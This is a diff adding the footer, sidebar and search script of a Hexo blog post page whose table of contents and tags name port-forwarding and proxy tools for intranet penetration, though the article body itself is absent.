+        <div style="text-align:center;color: #ccc;font-size:14px;">----------------------这是我的底线-----------------------</div>
+    
+</div>
+
+      </div>
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/工具/" rel="tag"><i class="fa fa-tag"></i> 工具</a>
+          
+            <a href="/tags/内网渗透/" rel="tag"><i class="fa fa-tag"></i> 内网渗透</a>
+          
+            <a href="/tags/端口转发/" rel="tag"><i class="fa fa-tag"></i> 端口转发</a>
+          
+            <a href="/tags/代理转发/" rel="tag"><i class="fa fa-tag"></i> 代理转发</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/04/25/磨皮皮之内网信息收集/" rel="next" title="磨皮皮之内网信息收集">
+                <i class="fa fa-chevron-left"></i> 磨皮皮之内网信息收集
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/04/25/磨皮皮之hash抓取/" rel="prev" title="磨皮皮之hash抓取">
+                磨皮皮之hash抓取 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">spira1</p>
+              <p class="site-description motion-element" itemprop="description">路还很长，我的目标是星辰大海</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">76</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">48</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:eagerseven@gmail.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#端口转发工具"><span class="nav-number">1.</span> <span class="nav-text">端口转发工具</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#windows"><span class="nav-number">1.1.</span> <span class="nav-text">windows</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Linux"><span class="nav-number">1.2.</span> <span class="nav-text">Linux</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#边界代理工具"><span class="nav-number">2.</span> <span class="nav-text">边界代理工具</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#windows-1"><span class="nav-number">2.1.</span> <span class="nav-text">windows</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#xscoks"><span class="nav-number">2.1.1.</span> <span class="nav-text">xscoks</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#EarthWorm"><span class="nav-number">2.1.2.</span> <span class="nav-text">EarthWorm</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#reGeorg-proxifier"><span class="nav-number">2.1.3.</span> <span class="nav-text">reGeorg+proxifier</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#ssh通道"><span class="nav-number">2.1.4.</span> <span class="nav-text">ssh通道</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#ssh通道socket代理"><span class="nav-number">2.1.5.</span> <span class="nav-text">ssh通道socket代理</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#直连shell端口转发"><span class="nav-number">2.1.6.</span> <span class="nav-text">直连shell端口转发</span></a></li></ol></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">spira1</span>
+
+  
+</div>
+<!--
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
+
+-->
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+          <span id="scrollpercent"><span>0</span>%</span>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
